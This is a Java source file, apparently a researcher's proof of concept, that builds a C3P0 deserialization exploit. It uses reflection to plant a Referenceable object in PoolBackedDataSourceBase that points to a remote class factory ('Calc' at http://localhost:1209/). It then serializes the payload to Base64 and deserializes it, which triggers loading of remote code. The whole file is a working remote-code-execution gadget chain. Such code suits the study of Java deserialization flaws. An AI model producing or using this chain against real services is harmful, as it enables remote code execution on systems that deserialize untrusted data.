package org.h3rmesk1t.C3P0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/16 2:31 下午
 */
public class C3P0ClassLoader {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static class notSerializable implements ConnectionPoolDataSource, Referenceable {

        String classFactory;
        String classFactoryLocation;

        public notSerializable(String classFactory, String classFactoryLocation) {

            this.classFactory = classFactory;
            this.classFactoryLocation = classFactoryLocation;
        }

        @Override
        public Reference getReference() throws NamingException {
            return new Reference(this.classFactory, this.classFactory, this.classFactoryLocation);
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public java.io.PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public void setLogWriter(java.io.PrintWriter out) throws SQLException {
        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    public static void main(String[] args) throws Exception {

        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        ConnectionPoolDataSource connectionPoolDataSource = new notSerializable("Calc", "http://localhost:1209/");
        Field field = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase, connectionPoolDataSource);

        String serializeData = serialize(poolBackedDataSourceBase);
        System.out.println(serializeData);
        unserialize(serializeData);
    }
}
